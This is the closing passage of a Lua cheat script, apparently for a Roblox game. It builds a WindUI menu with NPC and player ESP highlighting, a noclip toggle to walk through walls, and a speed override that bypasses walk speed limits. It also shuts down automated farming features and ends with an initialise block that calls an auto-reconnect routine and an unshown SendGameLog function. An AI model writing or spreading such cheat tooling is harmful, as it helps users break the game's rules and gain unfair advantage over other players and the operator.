                    autoUnlockEnabled = false; autoUpgradeEnabled = false; autoCollectEnabled = false; autoRollEnabled = false; autoPlaceEnabled = false
                    SetNoclip(false); SetSpeedHack(false); SetNoDelay(false)
                    ESPLoops.Ghost = false; ESPLoops.Player = false
                    if ESPThreads.Ghost then task.cancel(ESPThreads.Ghost) end
                    if ESPThreads.Player then task.cancel(ESPThreads.Player) end
                    ClearESP("Ghost"); ClearESP("Player")
                    WindUI:Destroy()
                end}
            }
        })
    end })

    -- VISION TAB
    TabVision:Section({ Title = "Highlights" })
    TabVision:Toggle({ Title = "NPC ESP", Desc = "Highlight NPC.", Default = false, Callback = function(v) Click(); SetESP("Ghost", v) end })
    TabVision:Toggle({ Title = "Player ESP", Desc = "Highlight other players.", Default = false, Callback = function(v) Click(); SetESP("Player", v) end })
    TabVision:Section({ Title = "Colors" })
    TabVision:Colorpicker({ Title = "Ghost Color", Default = GhostColor, Transparency = 0, Callback = function(c) GhostColor = c; UpdateESPColors() end })
    TabVision:Colorpicker({ Title = "Player Color", Default = PlayerColor, Transparency = 0, Callback = function(c) PlayerColor = c; UpdateESPColors() end })

    -- MOVEMENT TAB
    TabMove:Section({ Title = "Locomotion" })
    TabMove:Toggle({ Title = "Noclip", Desc = "Walk through walls.", Default = false, Callback = function(v) Click(); SetNoclip(v) end })
    TabMove:Toggle({ Title = "Speed Override", Desc = "Bypass walk speed limits.", Default = false, Callback = function(v) Click(); SetSpeedHack(v) end })
    TabMove:Slider({ Title = "WalkSpeed", Step = 1, Value = { Min = 11, Max = 100, Default = 25 }, Callback = function(v) Config.WalkSpeed = v end })

    -- Restore toggles states after UI creation
    -- (since WindUI might call callbacks on creation, we set them to initial state)
    -- Actually, we set defaults correctly.
end

--================================================
-- 7. INITIALIZE
--================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)